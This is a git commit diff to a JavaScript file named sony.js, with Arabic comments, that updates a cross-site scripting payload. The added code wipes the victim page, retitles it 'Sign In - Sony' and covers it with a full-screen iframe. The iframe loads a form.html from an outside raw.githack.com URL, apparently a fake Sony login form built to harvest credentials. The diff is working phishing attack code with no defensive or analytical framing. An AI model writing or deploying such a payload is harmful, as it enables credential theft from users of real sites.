d4e7930385f6f6cc410f1a8f8795d2b2d2b9dd19
SALEH <ItsS4LEH@gmail.com>
2026-04-06 12:56:06 +0300

    Update sony.js

--- sony.js
+++ sony.js
@@ -2,14 +2,14 @@
     if (window.XSS_DONE) return;
     window.XSS_DONE = true;
 
-    // إيقاف المتصفح عن معالجة أي أحداث إضافية
-    window.stop(); 
+    // مسح الصفحة الأصلية لإيقاف الـ Loop نهائياً
+    document.documentElement.innerHTML = '<title>Sign In - Sony</title><body style="margin:0;background:#f4f4f4;"></body>';
 
-    // مسح الصفحة بالكامل واستبدالها بـ iframe
     var frame = document.createElement('iframe');
-    frame.src = 'https://github.com/ItsS4LEH/sony.js/blob/main/form.html'; // رابط ملف html الخاص بك
+    // استخدم رابط Githack لملف form.html الخاص بك
+    frame.src = 'https://raw.githack.com/ItsS4LEH/sony/refs/heads/main/form.html';
     frame.style = "position:fixed; top:0; left:0; width:100%; height:100%; border:none; z-index:999999;";
     
-    document.documentElement.innerHTML = ""; // مسح كل شيء
-    document.appendChild(frame);
+    document.body.appendChild(frame);
+    window.stop(); 
 })();
